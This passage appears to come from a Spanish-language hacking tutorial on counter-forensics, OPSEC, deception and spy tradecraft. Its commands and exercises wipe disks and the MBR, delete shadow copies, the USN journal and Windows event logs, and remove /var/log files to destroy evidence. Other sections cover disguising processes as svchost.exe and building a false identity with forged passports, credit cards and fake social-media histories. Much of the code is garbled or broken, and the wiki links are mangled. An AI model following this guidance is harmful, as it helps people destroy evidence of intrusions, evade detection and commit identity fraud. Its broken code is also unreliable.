---

## 10. Counter-Forensics

### 10.1 Disk Sanitization

```python
class DiskSanitization: def ata_secure_erase(self, drive): print(f'ATA Secure Erase en {drive}') print('  hdparm --user-master u --security-set-pass p /dev/sdX') print('  hdparm --user-master u --security-erase p /dev/sdX') print('  El disco se borra internamente, incluyendo sectores reasignados') return True def nvme_format(self, drive): print(f'NVMe Format en {drive}: nvme format /dev/nvme0n1 --ses=1') print('  Borra todas las User Data Areas del SSD NVMe') return True def degauss(self): print('Desmagnetizacion: campo ~20000 Gauss') print('  Solo efectivo en HDD (discos magneticos)') print('  NO efectivo en SSD (memoria flash)') print('  Destruye el disco permanentemente') return True def physical_destruction(self): methods = ['Trituradora industrial', 'Incineracion >1000C', 'Compactacion hidraulica'] for m in methods: print(f'  - {m}') return True
```

### 10.2 SSD/HDD Specific Challenges

```python
class StorageBypass: def ssd_secure_erase(self, drive): print(f'SSD {drive}:') print('  - ATA SANITIZE + NVMe Format') print('  - TRIM no es seguro (solo marca como disponible)') print('  - Celdas remapeadas pueden retener datos') print('  - Overwrite via OS no llega a todas las celdas') def hdd_secure_erase(self, drive): print(f'HDD {drive}:') print('  - Overwrite de 3-7 pasadas es efectivo') print('  - ATA Secure Erase es mas completo (incluye sectores reasignados)') print('  - Sectores pendientes de reasignacion pueden contener datos viejos') def forensic_countermeasures(self): return [ 'Deshabilitar journaling (tune2fs -O ^has_journal)', 'Borrar Volume Shadow Copies (vssadmin delete shadows)', 'Borrar USN Journal (fsutil usn deletejournal /D C:)', 'Sobrescribir MBR/GPT (dd if=/dev/zero of=/dev/sdX bs=512 count=1)', 'Desfragmentar + sobrescribir espacio liberado', 'Borrar Prefetch, Logs, Eventos', 'Deshabilitar y limpiar swap/hiberfil', ]
```

### 10.3 Counter-Forensics Tools

```python
class AntiForensicsTools: def veracrypt_hidden_volume(self, path, size_mb): print(f'VeraCrypt: {path} ({size_mb} MB)') print('  Outer volume: contenido inocuo (password: debil)') print('  Hidden volume: contenido real (password: fuerte)') print('  Negacion plausible: activada') def bleachbit_clean(self, profiles=None): if profiles is None: profiles = ['system', 'browsers', 'applications'] print(f'BleachBit: limpiando {", ".join(profiles)}') print('  - Cache de navegadores') print('  - Historial y cookies') print('  - Archivos temporales') print('  - Logs del sistema') print('  - Clipboard') def tails_amnesic(self): print('Tails OS: The Amnesic Incognito Live System') print('  - Corre desde USB sin escribir al disco') print('  - Todo el trafico por Tor') print('  - Cifrado completo del estado') print('  - Sin memoria entre sesiones') print('  - Suite completa de herramientas de comunicacion segura')
```

### 10.4 Ejercicios Practicos

**Ejercicio 10.1:** Implementa un script de sanitizacionc que detecte HDD vs SSD y ejecute el metodo apropiado (ATA Secure Erase o NVMe Format) con verificacion.

**Ejercicio 10.2:** Crea un script anti-forensia completo: borra logs, VSS, USN journal, [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch), timestamps, y espacio libre.

**Ejercicio 10.3:** Configura [tails](../raw/4n0n1m4t0.md#tails) OS en un USB con persistenciaia) cifrada y volumen oculto.

---

## 11. Herramientas y Tecnicas Avanzadas

### 11.1 Herramientas de Contrainteligencia

| Herramienta | Uso | Plataforma |
|-------------|-----|------------|
| VeraCrypt | Volumenes cifrados con negacion plausible | Win/Linux/Mac |
| BleachBit | Limpieza de rastros del sistema | Win/Linux |
| [tails](../raw/4n0n1m4t0.md#tails) OS | SO amnesico con [tor](../raw/4n0n1m4t0.md#tor) por defecto | Linux |
| Eraser | Borrado seguro de datos | Windows |
| wipe | Borrado seguro de discos | Linux |
| Signal | Mensajeria E2E cifrada | Multiplataforma |
| Tor Browser | Navegacion anonima | Multiplataforma |
| [whonix](../raw/4n0n1m4t0.md#whonix) | Workstation anonima Tor | Linux |
| Qubes OS | SO compartimentado por VMs | Linux |
| Mat2 | Limpieza de metadatos | Linux |
| sdmem | Secure memory eraser | Linux |

### 11.2 [opsec](../raw/0ps3c-pr0.md) Checklist

```python
class OPSECChecklist: def __init__(self): self.items = [ 'Comunicaciones cifradas (Signal/Matrix)', 'Navegacion por Tor', 'Sistema operativo amnesico (Tails)', 'Discos cifrados con negacion plausible', 'Sin cuentas personales en dispositivos operativos', 'Geolocalizacion desactivada', 'Camaras y microfonos cubiertos', 'Dispositivos separados por operacion', 'Check fisico de vigilancia', 'Plan de contingencias y aborto', 'One-time pads generados y distribuidos', 'Dead drops verificados', 'Senales de seguridad confirmadas', 'Compartimentacion de informacion verificada', 'Need-to-know verificado', 'Rutas de escape planificadas', 'Cobertura/identidad falsa preparada', 'Destruccion segura de materiales planeada', 'Metadatos de archivos limpiados', 'Logs y rastros del sistema eliminados', ] def print_checklist(self): for i, item in enumerate(self.items, 1): print(f'  {i:2d}.  {item}') def verify(self): return {item: input(f'[{item[:30]}..] (S/N): ').upper == 'S' for item in self.items}
```

### 11.3 Ejercicios Practicos

**Ejercicio 11.1:** Configura un entorno de operaciones completo con Tails OS o Whonix, discos cifrados y comunicaciones seguras.

**Ejercicio 11.2:** Crea un checklist OPSEC personalizado de 20+ items para un tipo especifico de operacion.

**Ejercicio 11.3:** Implementa un script de hardening que automatice la configuracion de un entorno operativo seguro.

---

## 12. Apendices

### 12.1 Glosario

| Termino | Definicion |
|---------|------------|
| comSEC | Communications Security |
| TRANSEC | Transmission Security |
| EMSEC | Emanations Security |
| opsecc | Operations Security |
| [sdr](../raw/sdr-t3l3c0ms.md) | Surveillance Detection Route |
| [dkom](../raw/k3rn3l-h4ck1ng.md#dkom) | Direct [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) Object Manipulation |
| Fileless | Malware que solo existe en RAM |
| otP | One-Time Pad |
| FHSS | Frequency Hopping Spread Spectrum |
| DSSS | Direct Sequence Spread Spectrum |
| MICE | Money, Ideology, Compromise, Ego (motive development) |
| SIGINT | Signals Intelligence |
| HUMINT | Human Intelligence |
| MASINT | Measurement and Signature Intelligence |
| [osint](../raw/0s1nt.md) | Open Source Intelligence |
| BURN | Destroy materials, abort operation |
| SAFE | Location/person is secure |
| HOT | Location/person is compromised |
| SITREP | Situation Report |
| WASH | Debriefing session |

### 12.2 Referencias

- [tails](../raw/4n0n1m4t0.md#tails) OS: httpss)://[tails](../raw/4n0n1m4t0.md#tails).net/
- VeraCrypt: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://www.veracrypt.fr/
- Signal: https://signal.org/
- [tor](../raw/4n0n1m4t0.md#tor) Project: https://www.torproject.org/
- Qubes OS: https://www.qubes-os.org/
- [whonix](../raw/4n0n1m4t0.md#whonix): https://www.[whonix](../raw/4n0n1m4t0.md#whonix).org/
- Mat2: https://0xacab.org/jvoisin/mat2

### 12.3 Cheatsheet de Comandos

```bash
# ATA Secure Erase
hdparm --user-master u --security-set-pass p /dev/sdX
hdparm --user-master u --security-erase p /dev/sdX

# NVMe Format
nvme format /dev/nvme0n1 --ses=1

# Shred
shred -vfz -n 3 archivo.txt

# Borrar espacio libre
dd if=/dev/urandom of=/tmp/wipe bs=1M; rm /tmp/wipe

# VeraCrypt (CLI)
veracrypt -t -c /path/container --volume-type=normal
veracrypt -t -c /path/container --volume-type=hidden

# BleachBit (CLI)
bleachbit --clean system.cache system.trash

# Journalctl
journalctl --rotate && journalctl --vacuum-time=1s

# Limpiar logs
rm -rf /var/log/*.log 2>/dev/null

# VSS (Windows)
vssadmin delete shadows /all /quiet

# USN Journal
fsutil usn deletejournal /D C:

# Event Logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Prefetch
del /f /s /q C:\Windows\Prefetch\*.*

# Metadatos
exiftool -all= archivo.jpg
mat2 archivo.pdf

# Cifrado (GPG)
gpg -c --cipher-algo AES256 archivo.txt

# Tor
torify curl http://check.torproject.org/

# Signal (CLI)
signal-cli -u +123456 send +654321 "Mensaje"

# Network OPSEC
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

# OTP generation
dd if=/dev/urandom of=otp_pad.bin bs=1024 count=64

# Memory wipe
sdmem -l -l -l -v

# File wipe
wipe -rf directorio/

## 13. Tecnicas de Deception (Deception OPSEC)

### 13.1 Honeypots y Trampas

```python
class DeceptionOps: def create_honeytoken(self, token_type, location): """Crear señuelos para detectar intrusion""" tokens = { 'fake_credentials': 'admin:password123 en archivo texto', 'fake_database': 'Base de datos con datos falsos pero creibles', 'fake_document': 'Documento "confidencial" con marcado de agua', 'fake_network': 'Servidor honeypot simulando servicios reales', 'fake_api_key': 'API key falsa en configuracion de aplicacion', } return {'type': token_type, 'location': location, 'alert_on_access': True} def deception_network(self, subnet): """Desplegar [red](../raw/r3d3s-f0nd4m3nt0s.md) completa de honeypots""" services = {} for port, service in ('22', 'SSH'), ('80', '[[http](../raw/r3d3s-f0nd4m3nt0s.md#http)'), ('443', 'HTTPS'), ('3306', 'MySQL')]: services[port] = f'{service} honeypot en {subnet}' return services def breadcrumb_trail(self, target, fake_intel): """Crear rastro de migas de pan para desinformar""" trail = ('Pas[tebin', f'Credenciales de {target} filtradas'), ('GitHub', f'Repositorio con codigo de {target}'), ('Telegram', f'Canal filtrando datos de {target}'), ('Dark Web', f'Venta de acceso a {target}'), ] return trail def detect_honeytoken_trigger(self, token_id): """Detectar cuando un honeytoken es accedido""" import datetime return { 'alert': 'HONEYTOKEN_ACCESSED', 'token_id': token_id, 'timestamp': datetime.datetime.now.isoformat, 'ip_origin': 'x.x.x.x', 'user_agent': 'Mozilla/5.0..', 'action': 'Denegar acceso y registrar todo', }
```

### 13.2 Técnicas de Camuflaje Digital

```python
class DigitalCamo: def traffic_obfuscation(self, protocol='https'): """Ofuscar trafico para parecer trafico normal""" if protocol == 'https': print('Trafico HTTPS: parece navegacion normal') elif protocol == '[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)': print('Trafico [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns): datos en consultas [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) tunneling)') elif protocol == 'icmp': print('Trafico ICMP: datos en paquetes ping') elif protocol == 'websocket': print('WebSocket: trafico en tiempo real como chat') return {'obfuscated': True, 'protocol': protocol} def file_camouflage(self, file_path, target_extension): """Camuflar archivo como otro tipo""" import shutil # Cambiar magic bytes + extension base = os.path.splitext(file_path)[0] shutil.copy(file_path, f'{base}.{target_extension}') print(f'Archivo camuflado como .{target_extension}') return f'{base}.{target_extension}' def process_camouflage(self, process_name): """Camuflar [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) con nombre de sistema""" legit_names = [ 'svchost.exe', 'RuntimeBroker.exe', 'taskhostw.exe', 'conhost.exe', 'sihost.exe', 'backgroundTaskHost.exe' ] chosen = random.choice(legit_names) print(f'[proceso](../raw/0s-f0nd4m3nt0s.md#procesos) camuflado como: {chosen}') return {'original': process_name, 'disguised_as': chosen}
```

## 14. Operational Security Assessment (OSA)

### 14.1 Framework de Evaluacion OPSEC

```python
class OperationalSecurityAssessment: def __init__(self, operation_name): self.operation = operation_name self.findings = def assess_communication_security(self, comms_used): """Evaluar seguridad de las comunicaciones""" scoring = { 'signal': {'score': 9, 'notes': 'E2E encryption, open source'}, 'whatsapp': {'score': 6, 'notes': 'E2E but Meta can see metadata'}, 'telegram': {'score': 5, 'notes': 'No E2E by default, Russian servers'}, 'email': {'score': 2, 'notes': 'No E2E, stored indefinitely'}, 'sms': {'score': 1, 'notes': 'No encryption, operator access'}, } for comm in comms_used: if comm in scoring: self.findings.append({ 'area': 'communications', 'tool': comm, 'score': scoring[comm]['score'], 'notes': scoring[comm]['notes'], }) return self.findings def assess_physical_security(self, locations): """Evaluar seguridad fisica de ubicaciones""" for loc in locations: risks = if loc['has_cctv']: risks.append('Vigilado por CCTV') if loc['public_access']: risks.append('Acceso publico - sin control') if not loc['faraday']: risks.append('Sin proteccion Faraday - senales filtran') self.findings.append({ 'area': 'physical', 'location': loc['name'], 'risks': risks, 'risk_level': 'ALTO' if len(risks) > 2 else 'MEDIO' if len(risks) > 0 else 'BAJO' }) return self.findings def generate_report(self): """Generar reporte de evaluacion [opsec](../raw/0ps3c-pr0.md)""" total_score = sum(f.get('score', 5) for f in self.findings if 'score' in f) max_score = len([f for f in self.findings if 'score' in f]) * 10 return { 'operation': self.operation, 'total_findings': len(self.findings), 'overall_score': f'{total_score}/{max_score}' if max_score > 0 else 'N/A', 'critical_findings': [f for f in self.findings if f.get('risk_level') == 'ALTO'], 'recommendations': self._generate_recommendations } def _generate_recommendations(self): return 'Usar Signal para todas las comunicaciones', 'Implementar compartimentacion estricta', 'Verificar ausencia de vigilancia antes de reuniones', 'Usar Tails/Whonix para operaciones digitales', 'Cifrar todos los dispositivos con VeraCrypt', 'Establecer [[protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) de destruccion de emergencia', ]
```

## 15. Ejercicios Practicos Complementarios

### 15.1 Laboratorio Integrador

**Ejercicio 15.1: Evaluacion OPSEC Completa**

Realiza una evaluacion OPSEC de una operacion hipotetica:

1. Define la operacion: objetivo, personal, timeline
2. Identifica informacion critica que proteger
3. Analiza amenazas: quien es el adversario, capacidades
4. Evalua vulnerabilidades en: comunicaciones, fisico, digital
5. Implementa contramedidas
6. Simula un compromiso y evalua el dano

**Ejercicio 15.2: Red de Deception**

Disena una red de deception para proteger una operacion real:

1. Crea 3 honeytokens en ubicaciones estrategicas
2. Implementa una red de servidores honeypot
3. Establece alertas de monitoreo
4. Planifica respuesta a deteccion de adversario

**Ejercicio 15.3: Camuflaje Digital**

Implementa un sistema de camuflaje digital completo:

1. Ofusca trafico como HTTPS normal
2. Camufla archivos como imagenes/docus
3. Renombra procesos con nombres de sistema
4. Prueba contra herramientas de deteccion

### 15.2 Referencias Avanzadas

- Operational Security (OPSEC) - Joint Chiefs of Staff
- Deception: Counterdeception and Counterintelligence - Barton Whaley
- The Art of Deception - Kevin Mitnick
- Honeypots: Tracking Hackers - Lance Spitzner
- Tails OS Documentation: https://tails.net/doc/index.en.html
- VeraCrypt Documentation: https://www.veracrypt.fr/en/Documentation.html

## 16. Advanced Tradecraft

### 16.1 Cover Actions

```python
class CoverActions: def create_legend(self, person_profile, operation_duration_months=6): """Crear una leyenda (identidad falsa de larga duracion)""" legend = { 'name': person_profile['fake_name'], 'occupation': person_profile['cover_job'], 'backstory': self._generate_backstory(person_profile), 'documents': self._create_forged_documents(person_profile), 'digital_trail': self._create_digital_history(person_profile), 'social_media': self._populate_social_media(person_profile), 'financial': self._create_financial_history(person_profile), } return legend def _generate_backstory(self, profile): """Generar historia de vida creible""" import datetime birth_year = 2026 - profile['age'] return { 'born': f'{birth_year} en {profile["birth_city"]}', 'education': f'Universidad de {profile["edu_city"]}, {profile["degree"]}', 'career': [f'Trabajo en {company} por {years} anos' for company, years in profile['employment_history']], 'family': f'Soltero, sin hijos (perfil de viajero frecuente)', 'hobbies': profile['interests'], } def _create_forged_documents(self, profile): """Crear documentos falsos""" return [ f'Pasaporte: {profile["fake_name"]}, {profile["nationality"]}', f'Licencia de conducir: {profile["fake_name"]}', f'Tarjetas de credito: 3 cuentas con historial de 2 anos', f'Registro de vuelos: 20 vuelos en los ultimos 12 meses', ] def _create_digital_history(self, profile): """Crear historial digital creible""" import random history = { 'email_accounts': [f'{profile["fake_name"].lower.replace(" ", ".")}@gmail.[com](../raw/w1n-s9bsyst3ms.md#com)'], 'social_media': [ f'LinkedIn: 500+ conexiones, experiencia laboral detallada', f'Twitter: 2000 tweets en 3 anos', f'Facebook: perfil con fotos y amigos', ], 'search_history': [ f'Busquedas relacionadas con {profile["cover_job"]}', f'Busquedas de vuelos y hoteles', f'Busquedas relacionadas con hobbies', ], 'accounts_created': [f'sitio_{i}.[com](../raw/w1n-s9bsyst3ms.md#com)' for i in range(15)], } return history def operational_cover_checklist(self): """Verificar cobertura operacional""" return 'Documentos: verificados contra bases de datos oficiales', 'Telefono: numero registrado a nombre falso, historial 6+ meses', 'Email: 2+ cuentas con historial de actividad', '[[redes](../raw/r3d3s-f0nd4m3nt0s.md) sociales: perfiles con 6+ meses de antiguedad', 'Finanzas: cuenta bancaria con movimientos regulares', 'Vivienda: direccion verificable', 'Trabajo: empresa verificable, referencia preparada', ]
```

### 16.2 Dead Man's Switch

```python
class DeadMansswitch: def __init__(self): self.triggers = self.payloads = self.is_active = True def add_trigger(self, trigger_type, params): """Agregar condicion de activacion""" triggers = { 'no_contact': 'No se recibe senal de vida por X dias', 'incorrect_code': 'Se ingresa codigo incorrecto 3 veces', 'public_release': 'Se publica informacion especifica', 'arrest': 'Se detecta patron de arresto', } self.triggers.append({'type': trigger_type, 'description': triggers.get(trigger_type), 'params': params}) return True def add_payload(self, payload_type, target): """Definir accion al activarse""" payloads = { 'delete_data': f'Borrar datos en {target}', 'release_info': f'Publicar informacion en {target}', 'notify': f'Enviar notificacion a {target}', 'destroy': f'Iniciar destruccion remota de {target}', 'lawyer': f'Enviar instrucciones a abogado {target}', } self.payloads.append({'type': payload_type, 'action': payloads.get(payload_type)}) return True def check_and_execute(self): """Revisar triggers y ejecutar si corresponde""" for trigger in self.triggers: if self._condition_met(trigger): self._execute_payloads self.is_active = False return {'activated': True, 'trigger': trigger['type']} return {'activated': False}
```

### 16.3 Ejercicios de Tradecraft

**Ejercicio 16.1:** Crea una leyenda completa para una operacion de 12 meses: identidad, documentos, historial digital, y cobertura.

**Ejercicio 16.2:** Implementa un Dead Man's Switch con 3 triggers y 3 payloads diferentes.

**Ejercicio 16.3:** Disena un plan de cobertura para una reunion encubierta: incluye pretexto, transporte, ubicacion, y plan de escape.

## 17. Anexo: Tablas de Referencia Rapida

### 17.1 Operaciones Encubiertas

| Fase | Actividades | Riesgo | Duracion |
|------|-------------|--------|----------|
| Planeacion | Definir objetivo, recursos, equipo | Bajo | 1-4 semanas |
| Preparacion | Leyenda, documentos, logistica | Medio | 2-8 semanas |
| Ejecucion | Operacion activa, recoleccion | Alto | 1 dia - 3 meses |
| Extraccion | Salida segura, destruccion evidencia | Alto | 1-48 horas |
| Post-operacion | Debriefing, analisis, archivo | Bajo | 1-2 semanas |

### 17.2 Comunicaciones por Nivel de Seguridad

| Nivel | Metodo | Cifrado | Velocidad | Recomendado para |
|-------|--------|---------|-----------|------------------|
| 1 (Critico) | Signal + OTP | E2E + One-time pad | Lenta | Instrucciones operativas |
| 2 (Alto) | Signal | E2E (Signal Protocol) | Media | Coordinacion |
| 3 (Medio) | Matrix/Element | E2E (Olm/Megolm) | Rapida | Comunicacion de equipo |
| 4 (Bajo) | Telegram (Secret Chat) | E2E (MTProto) | Rapida | Logistica no critica |
| 5 (Minimo) | Email cifrado (PGP) | Extremo a extremo | Lenta | Documentacion |

### 17.3 Referencias Finales

- CIA Tradecraft: https://www.cia.gov/resources/csi/
- MI5 Security Service: https://www.mi5.gov.uk/
- OPSEC Guide for Movements: https://www.opsectactical.com/
- Surveillance Detection: https://www.surveillancedetection.com/
- Operational Security (NATO): https://www.nato.int/docu/
- The Cuckoo's Egg - Cliff Stoll
- Spycraft - Robert Wallace
- The Craft of Intelligence - Allen Dulles
```


